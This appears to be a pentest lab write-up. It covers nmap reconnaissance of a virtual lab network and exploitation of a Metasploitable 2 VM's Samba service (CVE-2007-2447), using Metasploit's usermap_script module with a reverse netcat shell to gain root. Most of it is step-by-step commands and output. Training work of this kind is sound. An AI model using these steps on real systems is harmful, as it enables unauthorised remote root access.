# The Big Project

## Creator: Guy Ben Moshe

### Metasploitable
<img width="402" height="455" alt="image" src="https://github.com/user-attachments/assets/137b70e8-8d11-4828-841a-3049f5120ece" />

### Kali
<img width="393" height="378" alt="image" src="https://github.com/user-attachments/assets/6f63e831-5835-4e8e-8772-84560a49827b" />

### Windows 10 + Windows server
<img width="473" height="537" alt="image" src="https://github.com/user-attachments/assets/84299800-97b0-4761-9577-b134550683fa" />

# Recone

I started by seting a pentest directory:

<img width="246" height="152" alt="image" src="https://github.com/user-attachments/assets/eef43b6c-b3f9-4284-8e19-1dc283ab3503" />


Now lets get the ip of the metasploit from kali

this is the kali ip address

<img width="795" height="105" alt="image" src="https://github.com/user-attachments/assets/0603f2c2-7e49-436d-9e27-3b5d8a9e3841" />

now lets scan the 172.16.10.0/24
```
└─# nmap 172.16.10.0/24 -sn | tee ~/pentest/recon/172.16.10.0.24.-sn.txt 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-19 04:44 EST
Nmap scan report for 172.16.10.1
Host is up (0.00027s latency).
MAC Address: 00:50:56:C0:00:0A (VMware)
Nmap scan report for 172.16.10.129
Host is up (0.00016s latency).
MAC Address: 00:0C:29:FA:DD:34 (VMware)
Nmap scan report for 172.16.10.254
Host is up (0.00013s latency).
MAC Address: 00:50:56:FB:C2:00 (VMware)
Nmap scan report for 172.16.10.128
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 13.63 seconds
```

we got the metasploit ip address to be `172.16.10.129`

now we can do a deeper scan on the metasploit

```
└─# nmap 172.16.10.129 -sV -Pn -O --min-rate 10000 | tee ~/pentest/recon/172.16.10.0.24.-sV-Pn-O--min-rate10000.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-19 04:52 EST
Nmap scan report for 172.16.10.129
Host is up (0.00059s latency).
Not shown: 978 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login?
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8180/tcp open  unknown
MAC Address: 00:0C:29:FA:DD:34 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 199.79 seconds
```

we see that there is a lot of services open, and most of them have vulnerabilites to get root access to the machine.
i will exploit the samba service.

i searched the internet to find RCE (remote code execution) on samba. and it gave me 
`Common RCE Vulnerabilities by Version Range`
```
• Samba 3.0.0 – 3.0.25rc3 (CVE-2007-2447): Command injection via unfiltered user input passed to /bin/sh through MS-RPC calls when username map script or similar external scripts are enabled in smb.conf. Often encountered in lab targets such as Metasploitable 2.
• Samba 3.5.0 – 4.5.x (CVE-2017-7494 / SambaCry): Allows loading a shared library from a writable SMB share to execute code as root.
• Samba < 4.13.17 / 4.14.12 / 4.15.5 (CVE-2021-44142): Out-of-bounds heap read/write in the vfs_fruit module when parsing extended attributes (EA) metadata in smbd.
• Samba 4.x / Recent Advisories: Specific flaws depend on the exact build and enabled VFS/script features (such as CVE-2026-4408).
```
i am using the `CVE-2007-2447`.

# Exploit - metasploit
i use msfconsole to find and use the CVE:

```
msf > search CVE-2007-2447

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script

msf > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, http, socks5, socks5h
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.89.85.215     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

```

Now i need to set the `RHOSTS` to the metasploit IP address

```
sf exploit(multi/samba/usermap_script) > set RHOSTS 172.16.10.129
RHOSTS => 172.16.10.129
```

now that everything is set i can run the exploit and get root on the machine

```
msf exploit(multi/samba/usermap_script) > run
[*] Started reverse TCP handler on 10.89.85.215:4444 
[*] Command shell session 1 opened (10.89.85.215:4444 -> 10.89.85.249:41347) at 2026-11-19 06:13:41 -0500

whoami
root
uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```

and we see that we got root in the metasploitable.
